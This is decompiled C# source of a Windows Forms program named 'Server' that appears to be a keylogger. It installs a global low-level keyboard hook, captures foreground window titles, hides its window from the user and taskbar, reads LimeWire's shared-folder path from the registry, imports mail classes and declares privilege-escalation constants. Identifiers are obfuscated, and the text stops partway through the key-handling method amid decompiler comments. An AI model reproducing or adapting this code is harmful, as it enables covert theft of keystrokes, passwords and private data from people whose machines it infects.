using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Server.My;

namespace Server;

[DesignerGenerated]
public class Form1 : Form
{
	public class KeyboardHook
	{
		public delegate void c9YMqrTuOUEventHandler(Keys Key);

		public delegate void REHlTzGAkkEventHandler(Keys Key);

		private delegate int KeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

		private struct KBDLLHOOKSTRUCT
		{
			public int vkCode;

			public int scancode;

			public int flags;

			public int time;

			public int dwExtraInfo;
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private const int HC_ACTION = 0;

		private const int WH_KEYBOARD_LL = 13;

		private const int WM_KEYDOWN = 256;

		private const int WM_KEYUP = 257;

		private const int WM_SYSKEYDOWN = 260;

		private const int WM_SYSKEYUP = 261;

		private static c9YMqrTuOUEventHandler c9YMqrTuOUEvent;

		private static REHlTzGAkkEventHandler REHlTzGAkkEvent;

		private static int KeyHook;

		private static KeyboardProcDelegate KeyHookDelegate;

		public static event c9YMqrTuOUEventHandler c9YMqrTuOU
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				c9YMqrTuOUEvent = (c9YMqrTuOUEventHandler)Delegate.Combine(c9YMqrTuOUEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				c9YMqrTuOUEvent = (c9YMqrTuOUEventHandler)Delegate.Remove(c9YMqrTuOUEvent, value);
			}
		}

		public static event REHlTzGAkkEventHandler REHlTzGAkk
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				REHlTzGAkkEvent = (REHlTzGAkkEventHandler)Delegate.Combine(REHlTzGAkkEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				REHlTzGAkkEvent = (REHlTzGAkkEventHandler)Delegate.Remove(REHlTzGAkkEvent, value);
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int idHook, KeyboardProcDelegate lpfn, int hmod, int dwThreadId);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		public KeyboardHook()
		{
			lock (__ENCList)
			{
				__ENCList.Add(new WeakReference(this));
			}
			KeyHookDelegate = KeyboardProc;
			KeyHook = SetWindowsHookExA(13, KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		private static int KeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
		{
			if (nCode == 0)
			{
				switch (wParam)
				{
				case 256:
				case 260:
					c9YMqrTuOUEvent?.Invoke((Keys)lParam.vkCode);
					break;
				case 257:
				case 261:
					REHlTzGAkkEvent?.Invoke((Keys)lParam.vkCode);
					break;
				}
			}
			return CallNextHookEx(KeyHook, nCode, wParam, lParam);
		}

		protected override void Finalize()
		{
			UnhookWindowsHookEx(KeyHook);
			base.Finalize();
		}
	}

	private struct LUID_AND_ATTRIBUTES
	{
		public LUID pLuid;

		public int Attributes;
	}

	private struct LUID
	{
		public int LowPart;

		public int HighPart;
	}

	private struct TOKEN_PRIVILEGES
	{
		public int PrivilegeCount;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
		public LUID_AND_ATTRIBUTES[] Privileges;
	}

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("TextBox4")]
	private TextBox _TextBox4;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("Timer4")]
	private Timer _Timer4;

	[AccessedThroughProperty("Timer6")]
	private Timer _Timer6;

	[AccessedThroughProperty("textbox5")]
	private TextBox _textbox5;

	[AccessedThroughProperty("TextBox6")]
	private TextBox _TextBox6;

	[AccessedThroughProperty("TextBox7")]
	private TextBox _TextBox7;

	[AccessedThroughProperty("Timer7")]
	private Timer _Timer7;

	[AccessedThroughProperty("Timer8")]
	private Timer _Timer8;

	[AccessedThroughProperty("Timer5")]
	private Timer _Timer5;

	private string nl;

	private string[] options;

	private string nie9zcYPUv;

	private string zNYN2apmvZ;

	private string CMoPfL3l2I;

	private string b4d8hOGWIz;

	private string n01ypBQrhK;

	private string fazEqHLo8Y;

	private string BIYaksaUXR;

	private string TXPYU9ol9I;

	private string Jje3WLD2TX;

	private string RK8mvhFc0D;

	private string u1ISb2tL71;

	private string xUXee9fLsc;

	private string Hoce22GrYR;

	private string FLs3dYBgcK;

	private string HReXgzZX4q;

	private const string N21juq02jEGNmaq0wedearsjiqawdEXASi2 = "@Ghxp44YKYC@";

	[AccessedThroughProperty("kbHook")]
	private KeyboardHook _kbHook;

	private string strin;

	private string LimePfad;

	public const string SE_DEBUG_NAME = "SeDebugPrivilege";

	public const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";

	public const string SE_SECURITY_NAME = "SeSecurityPrivileges";

	public const string SE_TCB_NAME = "SeTcbPrivileges";

	public const string SE_TAKE_OWNERSHIP_NAME = "SeTakeOwnershipPrivileges";

	private const int TOKEN_ADJUST_PRIVILEGES = 32;

	private const int TOKEN_QUERY = 8;

	private const int SE_PRIVILEGE_ENABLED = 2;

	private const int ANYSIZE_ARRAY = 1;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual TextBox TextBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox4 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			if (_Timer4 != null)
			{
				_Timer4.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			if (_Timer4 != null)
			{
				_Timer4.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer6_Tick;
			if (_Timer6 != null)
			{
				_Timer6.remove_Tick(eventHandler);
			}
			_Timer6 = value;
			if (_Timer6 != null)
			{
				_Timer6.add_Tick(eventHandler);
			}
		}
	}

	internal virtual TextBox textbox5
	{
		[DebuggerNonUserCode]
		get
		{
			return _textbox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_textbox5 = value;
		}
	}

	internal virtual TextBox TextBox6
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox6 = value;
		}
	}

	internal virtual TextBox TextBox7
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox7 = value;
		}
	}

	internal virtual Timer Timer7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer7_Tick;
			if (_Timer7 != null)
			{
				_Timer7.remove_Tick(eventHandler);
			}
			_Timer7 = value;
			if (_Timer7 != null)
			{
				_Timer7.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer8_Tick;
			if (_Timer8 != null)
			{
				_Timer8.remove_Tick(eventHandler);
			}
			_Timer8 = value;
			if (_Timer8 != null)
			{
				_Timer8.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer5 = value;
		}
	}

	private virtual KeyboardHook kbHook
	{
		[DebuggerNonUserCode]
		get
		{
			return _kbHook;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			KeyboardHook.c9YMqrTuOUEventHandler value2 = shiftandcaps;
			if (_kbHook != null)
			{
				KeyboardHook.c9YMqrTuOU -= value2;
			}
			_kbHook = value;
			if (_kbHook != null)
			{
				KeyboardHook.c9YMqrTuOU += value2;
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		nl = Environment.NewLine;
		kbHook = new KeyboardHook();
		strin = null;
		LimePfad = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "Shared", (object)0));
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Expected O, but got Unknown
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Expected O, but got Unknown
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Expected O, but got Unknown
		components = new Container();
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		TextBox4 = new TextBox();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer3 = new Timer(components);
		Timer4 = new Timer(components);
		Timer6 = new Timer(components);
		textbox5 = new TextBox();
		TextBox6 = new TextBox();
		TextBox7 = new TextBox();
		Timer7 = new Timer(components);
		Timer8 = new Timer(components);
		Timer5 = new Timer(components);
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(12, 12);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(308, 197);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		TextBox textBox3 = TextBox2;
		location = new Point(338, 12);
		((Control)textBox3).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(100, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(1);
		TextBox textBox5 = TextBox3;
		location = new Point(338, 38);
		((Control)textBox5).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox6 = TextBox3;
		size = new Size(100, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(2);
		TextBox textBox7 = TextBox4;
		location = new Point(338, 64);
		((Control)textBox7).set_Location(location);
		((Control)TextBox4).set_Name("TextBox4");
		TextBox textBox8 = TextBox4;
		size = new Size(100, 20);
		((Control)textBox8).set_Size(size);
		((Control)TextBox4).set_TabIndex(3);
		TextBox obj = textbox5;
		location = new Point(444, 12);
		((Control)obj).set_Location(location);
		textbox5.set_Multiline(true);
		((Control)textbox5).set_Name("textbox5");
		TextBox obj2 = textbox5;
		size = new Size(219, 72);
		((Control)obj2).set_Size(size);
		((Control)textbox5).set_TabIndex(4);
		TextBox textBox9 = TextBox6;
		location = new Point(326, 90);
		((Control)textBox9).set_Location(location);
		TextBox6.set_Multiline(true);
		((Control)TextBox6).set_Name("TextBox6");
		TextBox textBox10 = TextBox6;
		size = new Size(202, 107);
		((Control)textBox10).set_Size(size);
		((Control)TextBox6).set_TabIndex(5);
		TextBox textBox11 = TextBox7;
		location = new Point(338, 202);
		((Control)textBox11).set_Location(location);
		((Control)TextBox7).set_Name("TextBox7");
		TextBox textBox12 = TextBox7;
		size = new Size(100, 20);
		((Control)textBox12).set_Size(size);
		((Control)TextBox7).set_TabIndex(6);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.White);
		size = new Size(730, 234);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)TextBox7);
		((Control)this).get_Controls().Add((Control)(object)TextBox6);
		((Control)this).get_Controls().Add((Control)(object)textbox5);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TransparencyKey(Color.White);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string GetActiveWindowTitle()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public void shiftandcaps(Keys Key)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Invalid comparison between Unknown and I4
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Invalid comparison between Unknown and I4
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Invalid comparison between Unknown and I4
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Invalid comparison between Unknown and I4
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Invalid comparison between Unknown and I4
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Invalid comparison between Unknown and I4
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Invalid comparison between Unknown and I4
		//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Invalid comparison between Unknown and I4
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Invalid comparison between Unknown and I4
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Invalid comparison between Unknown and I4
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Invalid comparison between Unknown and I4
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Invalid comparison between Unknown and I4
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Invalid comparison between Unknown and I4
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Invalid comparison between Unknown and I4
		//IL_016a: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Invalid comparison between Unknown and I4
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		//IL_0177: Invalid comparison between Unknown and I4
		//IL_017e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Invalid comparison between Unknown and I4
		//IL_01aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Invalid comparison between Unknown and I4
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b7: Invalid comparison between Unknown and I4
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c1: Invalid comparison between Unknown and I4
		//IL_01c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cb: Invalid comparison between Unknown and I4
		//IL_01f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f7: Invalid comparison between Unknown and I4
		//IL_0220: Unknown result type (might be due to invalid IL or missing references)
		//IL_0223: Invalid comparison between Unknown and I4
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Invalid comparison between Unknown and I4
		//IL_0256: Unknown result type (might be due to invalid IL or missing references)
		//IL_0259: Invalid comparison between Unknown and I4
		//IL_0260: Unknown result type (might be due to invalid IL or missing references)
		//IL_0263: Invalid comparison between Unknown and I4
		//IL_028c: Unknown result type (might be due to invalid IL or missing references)
		//IL_028f: Invalid comparison between Unknown and I4
		//IL_02b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bb: Invalid comparison between Unknown and I4
		//IL_02c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c5: Invalid comparison between Unknown and I4
		//IL_02cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cf: Invalid comparison between Unknown and I4
		//IL_02f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fb: Invalid comparison between Unknown and I4
		//IL_0324: Unknown result type (might be due to invalid IL or missing references)
		//IL_0327: Invalid comparison between Unknown and I4
		//IL_032e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0331: Invalid comparison between Unknown and I4
		//IL_0338: Unknown result type (might be due to invalid IL or missing references)
		//IL_033b: Invalid comparison between Unknown and I4
		//IL_0342: Unknown result type (might be due to invalid IL or missing references)
		//IL_0345: Invalid comparison between Unknown and I4
		//IL_034c: Unknown result type (might be due to invalid IL or missing references)
		//IL_034f: Invalid comparison between Unknown and I4
		//IL_0356: Unknown result type (might be due to invalid IL or missing references)
		//IL_0359: Invalid comparison between Unknown and I4
		//IL_0382: Unknown result type (might be due to invalid IL or missing references)
		//IL_0385: Invalid comparison between Unknown and I4
		//IL_038c: Unknown result type (might be due to invalid IL or missing references)
		//IL_038f: Invalid comparison between Unknown and I4
		//IL_0396: Unknown result type (might be due to invalid IL or missing references)
		//IL_0399: Invalid comparison between Unknown and I4
		//IL_03a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a3: Invalid comparison between Unknown and I4
		//IL_03aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ad: Invalid comparison between Unknown and I4
		//IL_03b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Invalid comparison between Unknown and I4
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c1: Invalid comparison between Unknown and I4
		//IL_03c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cb: Invalid comparison between Unknown and I4
		//IL_03d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d8: Invalid comparison between Unknown and I4
		//IL_03df: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e5: Invalid comparison between Unknown and I4
		//IL_03ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f2: Invalid comparison between Unknown and I4
		//IL_03f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ff: Invalid comparison between Unknown and I4
		//IL_0406: Unknown result type (might be due to invalid IL or missing references)
		//IL_040c: Invalid comparison between Unknown and I4
		//IL_0413: Unknown result type (might be due to invalid IL or missing references)
		//IL_0419: Invalid comparison between Unknown and I4
		//IL_0420: Unknown result type (might be due to invalid IL or missing references)
		//IL_0426: Invalid comparison between Unknown and I4
		//IL_042d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0433: Invalid comparison between Unknown and I4
		//IL_045c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0462: Invalid comparison between Unknown and I4
		//IL_0469: Unknown result type (might be due to invalid IL or missing references)
		//IL_046f: Invalid comparison between Unknown and I4
		//IL_0476: Unknown result type (might be due to invalid IL or missing references)
		//IL_0479: Invalid comparison between Unknown and I4
		//IL_04a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a5: Invalid comparison between Unknown and I4
		//IL_04ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_04af: Invalid comparison between Unknown and I4
		//IL_04b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b9: Invalid comparison between Unknown and I4
		//IL_04e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e5: Invalid comparison between Unknown and I4
		//IL_050e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0511: Invalid comparison between Unknown and I4
		//IL_0518: Unknown result type (might be due to invalid IL or missing references)
		//IL_051b: Invalid comparison between Unknown and I4
		//IL_0522: Unknown result type (might be due to invalid IL or missing references)
		//IL_0525: Invalid comparison between Unknown and I4
		//IL_052c: Unknown result type (might be due to invalid IL or missing references)
		//IL_052f: Invalid comparison between Unknown and I4
		//IL_0536: Unknown result type (might be due to invalid IL or missing references)
		//IL_0539: Invalid comparison between Unknown and I4
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Invalid comparison between Unknown and I4
		//IL_054a: Unknown result type (might be due to invalid IL or missing references)
		//IL_054d: Invalid comparison between Unknown and I4
		//IL_0576: Unknown result type (might be due to invalid IL or missing references)
		//IL_0579: Invalid comparison between Unknown and I4
		//IL_0580: Unknown result type (might be due to invalid IL or missing references)
		//IL_0583: Invalid comparison between Unknown and I4
		//IL_058a: Unknown result type (might be due to invalid IL or missing references)
		//IL_058d: Invalid comparison between Unknown and I4
		//IL_05b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Invalid comparison between Unknown and I4
		//IL_05bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c2: Invalid comparison between Unknown and I4
		//IL_05c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_05cc: Invalid comparison between Unknown and I4
		//IL_05d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d6: Invalid comparison between Unknown and I4
		//IL_05dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e0: Invalid comparison between Unknown and I4
		//IL_0609: Unknown result type (might be due to invalid IL or missing references)
		//IL_060c: Invalid comparison between Unknown and I4
		//IL_0635: Unknown result type (might be due to invalid IL or missing references)
		//IL_0638: Invalid comparison between Unknown and I4
		//IL_0661: Unknown result type (might be due to invalid IL or missing references)
		//IL_0664: Invalid comparison between Unknown and I4
		//IL_068d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0690: Invalid comparison between Unknown and I4
		//IL_0697: Unknown result type (might be due to invalid IL or missing references)
		//IL_069a: Invalid comparison between Unknown and I4
		//IL_06a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06a4: Invalid comparison between Unknown and I4
		//IL_06a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ab: Invalid comparison between Unknown and I4
		//IL_06af: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b2: Invalid comparison between Unknown and I4
		//IL_0f8c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f8f: Invalid comparison between Unknown and I4
		//IL_0f96: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f99: Invalid comparison between Unknown and I4
		//IL_0fa0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fa3: Invalid comparison between Unknown and I4
		//IL_0fcc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fcf: Invalid comparison between Unknown and I4
		//IL_0fd6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd9: Invalid comparison between Unknown and I4
		//IL_0fe0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fe3: Invalid comparison between Unknown and I4
		//IL_0fea: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fed: Invalid comparison between Unknown and I4
		//IL_0ff4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ff7: Invalid comparison between Unknown and I4
		//IL_0ffe: Unknown result type (might be due to invalid IL or missing references)
		//IL_1001: Invalid comparison between Unknown and I4
		//IL_1008: Unknown result type (might be due to invalid IL or missing references)
		//IL_100b: Invalid comparison between Unknown and I4
		//IL_1034: Unknown result type (might be due to invalid IL or missing references)
		//IL_1037: Invalid comparison between Unknown and I4
		//IL_103e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1041: Invalid comparison between Unknown and I4
		//IL_1048: Unknown result type (might be due to invalid IL or missing references)
		//IL_104b: Invalid comparison between Unknown and I4
		//IL_1074: Unknown result type (might be due to invalid IL or missing references)
		//IL_1077: Invalid comparison between Unknown and I4
		//IL_107e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1081: Invalid comparison between Unknown and I4
		//IL_1088: Unknown result type (might be due to invalid IL or missing references)
		//IL_108b: Invalid comparison between Unknown and I4
		//IL_10b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b7: Invalid comparison between Unknown and I4
		//IL_10be: Unknown result type (might be due to invalid IL or missing references)
		//IL_10c1: Invalid comparison between Unknown and I4
		//IL_10ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ed: Invalid comparison between Unknown and I4
		//IL_10f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_10f7: Invalid comparison between Unknown and I4
		//IL_10fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_1101: Invalid comparison between Unknown and I4
		//IL_1108: Unknown result type (might be due to invalid IL or missing references)
		//IL_110b: Invalid comparison between Unknown and I4
		//IL_1112: Unknown result type (might be due to invalid IL or missing references)
